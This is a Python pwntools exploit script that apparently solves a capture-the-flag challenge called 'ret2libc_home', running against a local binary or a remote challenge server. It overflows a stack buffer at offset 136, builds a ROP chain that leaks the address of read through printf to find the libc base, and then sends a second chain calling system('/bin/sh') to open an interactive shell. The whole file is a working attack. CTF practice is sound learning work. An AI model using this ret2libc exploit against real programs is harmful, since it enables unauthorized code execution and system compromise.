#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_home', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

#Addresses (use nm or readelf to inspect a priori the relative offset in libc)
POP_RDI     = 0x00000000004011ff
RET         = 0x000000000040101a
READ_GOT    = elf.got['read']        #read because its offset in libc does not end with '\x00' like printf, so printf function can read it normally 
PRINTF_PLT  = elf.plt['printf']
MAIN        = elf.sym['main']

OFFSET = 136

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
            pause()
    else:
        global libc
        libc = ELF('./libc.so.6', checksec=False)
        r = remote('offsec.m0lecon.it',13548)
    
    return r

def main():
    p = conn()
    print(hex(PRINTF_PLT))
    print(hex(READ_GOT))
    #Phase 1: find the libc base address
    p.recvuntil(b'message:\n')
    payload1 = flat(
        b'A'*OFFSET,
        p64(RET),
        p64(POP_RDI),
        p64(READ_GOT),
        p64(PRINTF_PLT),
        p64(MAIN)
    )
    p.sendline(payload1)
    p.recvline()

    leak = p.recvline().split(b"W")[0]
    
    leak_addr = u64(leak.ljust(8,b'\x00'))
    log.info(f"leak address = {leak_addr:#x}")
    libc.address = leak_addr - libc.symbols['read']
    log.info(f"libc base address = {libc.address:#x}")

    #Phase 2: execute system('/bin/sh')
    system_addr = libc.symbols['system']
    BINSH = next(libc.search('/bin/sh\x00'))

    p.recvuntil(b'message:\n')
    payload2 = flat(
        b'A'*OFFSET,
        p64(POP_RDI),
        p64(BINSH),
        p64(system_addr)
    )
    p.send(payload2)
    
    p.interactive()

if __name__ == "__main__":
    main()